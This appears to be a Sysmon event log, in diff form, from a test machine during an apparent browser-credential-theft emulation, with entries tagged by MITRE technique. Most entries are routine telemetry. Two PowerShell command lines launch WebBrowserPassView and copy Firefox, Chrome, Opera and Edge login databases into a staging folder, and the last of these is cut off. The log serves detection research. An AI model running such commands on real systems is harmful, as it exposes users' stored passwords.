+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:27.892
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+PipeName: \PSHost.133461381272237267.6112.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:27.781
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_flnczf4r.jtu.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:27.762
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_flnczf4r.jtu.ps1
+CreationUtcTime: 2023-12-04 04:35:27.762
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:27.676
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:27.318
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:27.299
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:27.290
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:27.290
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:27.282
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:27.228
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-570f-656d-e802-000000001000}
+TargetProcessId: 6112
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:27.223
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Start-Process \""""C:temp\bin\WebBrowserPassView.exe\""""
+Start-Sleep -Second 4
+Stop-Process -Name \""""WebBrowserPassView\""""}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:27 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:27.228
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:26 PM,Microsoft-Windows-Sysmon,8,CreateRemoteThread detected (rule: CreateRemoteThread),"CreateRemoteThread detected:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:26.962
+SourceProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGuid: {1ac2ee8c-570e-656d-e702-000000001000}
+TargetProcessId: 5532
+TargetImage: <unknown process>
+NewThreadId: 5772
+StartAddress: 0x00007FF78D094450
+StartModule: -
+StartFunction: -
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:26 PM,Microsoft-Windows-Sysmon,3,Network connection detected (rule: NetworkConnect),"Network connection detected:
+RuleName: technique_id=T1036,technique_name=Masquerading
+UtcTime: 2023-12-04 04:35:24.864
+ProcessGuid: {1ac2ee8c-542b-656d-1a01-000000001000}
+ProcessId: 244
+Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MsMpEng.exe
+User: NT AUTHORITY\SYSTEM
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.114.196
+SourceHostname: -
+SourcePort: 50034
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 13.91.129.128
+DestinationHostname: -
+DestinationPort: 443
+DestinationPortName: -"
+Information,12/3/2023 8:35:26 PM,Microsoft-Windows-Sysmon,8,CreateRemoteThread detected (rule: CreateRemoteThread),"CreateRemoteThread detected:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:26.239
+SourceProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGuid: {1ac2ee8c-570d-656d-e602-000000001000}
+TargetProcessId: 4484
+TargetImage: <unknown process>
+NewThreadId: 3112
+StartAddress: 0x00007FF78D094450
+StartModule: -
+StartFunction: -
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:25 PM,Microsoft-Windows-Sysmon,8,CreateRemoteThread detected (rule: CreateRemoteThread),"CreateRemoteThread detected:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:25.412
+SourceProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGuid: {1ac2ee8c-570c-656d-e402-000000001000}
+TargetProcessId: 3100
+TargetImage: <unknown process>
+NewThreadId: 2216
+StartAddress: 0x00007FF78D094450
+StartModule: -
+StartFunction: -
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:24 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:24.599
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:24 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:24.585
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:23 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:23.491
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:23 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:23.100
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+PipeName: \PSHost.133461381229032611.672.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:23 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:23.038
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ncq4evk2.d5o.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:23 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:22.991
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ncq4evk2.d5o.ps1
+CreationUtcTime: 2023-12-04 04:35:22.991
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:22.959
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:22.944
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:22.927
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:22.927
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:22.927
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:22.912
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:22.896
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-570a-656d-e202-000000001000}
+TargetProcessId: 672
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1083,technique_name=File and Directory Discovery
+UtcTime: 2023-12-04 04:35:22.903
+ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
+ProcessId: 672
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {$exfil_folder = \""""$env:temp\T1555.003\""""
+if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
+$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
+if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
+if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
+if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
+if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
+if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
+if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
